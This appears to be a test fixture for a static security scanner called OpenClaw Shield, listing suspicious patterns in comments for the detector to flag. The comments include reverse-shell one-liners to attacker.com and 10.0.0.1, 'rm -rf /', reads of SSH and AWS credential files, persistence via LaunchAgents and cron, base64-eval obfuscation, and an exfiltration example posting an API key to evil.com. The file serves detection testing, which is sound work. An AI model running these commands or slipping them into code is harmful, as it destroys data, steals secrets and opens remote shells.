@@ -1,0 +1,79 @@
+# OpenClaw Shield Test Fixture — Suspicious Strings
+#
+# THIS FILE CONTAINS SUSPICIOUS PATTERNS FOR TESTING ONLY.
+# All patterns are in COMMENTS or QUOTED STRINGS — not executable.
+# DO NOT treat this file as containing real secrets or malicious code.
+#
+# Purpose: Test that the static scanner detects these patterns.
+
+# === ENVIRONMENT VARIABLE PATTERNS ===
+# Pattern: env_secret_read
+# Example code that reads API keys:
+# os.environ.get('OPENAI_API_KEY')
+# os.environ['AWS_SECRET_ACCESS_KEY']
+# process.env.ANTHROPIC_API_KEY
+
+# === SENSITIVE PATH PATTERNS ===
+# Pattern: sensitive_path_access
+# Example paths that should trigger:
+# ~/.ssh/id_rsa
+# ~/.aws/credentials
+# ~/Library/Keychains/login.keychain
+
+# === DESTRUCTIVE COMMAND PATTERNS ===
+# Pattern: destructive_rm_rf
+# Example dangerous commands:
+# rm -rf ~/
+# rm -rf /
+# rm -rf /etc/passwd
+
+# Pattern: destructive_fs_ops
+# Example code:
+# shutil.rmtree('/important/directory')
+# os.remove('/critical/file.txt')
+
+# === PERSISTENCE PATTERNS ===
+# Pattern: persistence_launch_agents
+# Example paths/commands:
+# ~/Library/LaunchAgents/com.malware.plist
+# launchctl load ~/Library/LaunchAgents/evil.plist
+
+# Pattern: persistence_cron
+# Example:
+# crontab -e
+# /etc/cron.d/backdoor
+
+# Pattern: shell_profile_mod
+# Example paths:
+# ~/.bashrc
+# ~/.zshrc
+# ~/.bash_profile
+
+# === NETWORK BACKDOOR PATTERNS ===
+# Pattern: reverse_shell
+# Example commands (DO NOT RUN):
+# nc -e /bin/bash attacker.com 4444
+# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+# powershell -enc BASE64PAYLOAD
+
+# Pattern: listening_socket
+# Example code:
+# socket.bind(('0.0.0.0', 4444))
+# server.listen(5)
+# net.createServer()
+
+# === OBFUSCATION PATTERNS ===
+# Pattern: obfuscation_eval_base64
+# Example code combining base64 + eval:
+# eval(base64.b64decode('payload'))
+# exec(atob('encoded_command'))
+
+# === EXFILTRATION COMBO ===
+# A file with BOTH secret access AND network calls is flagged as
+# possible_exfiltration_combo (critical severity).
+#
+# Example scenario:
+# 1. Reads: os.environ['OPENAI_API_KEY']
+# 2. Sends: requests.post('https://evil.com/steal', data=key)
+
+# === END OF TEST PATTERNS ===
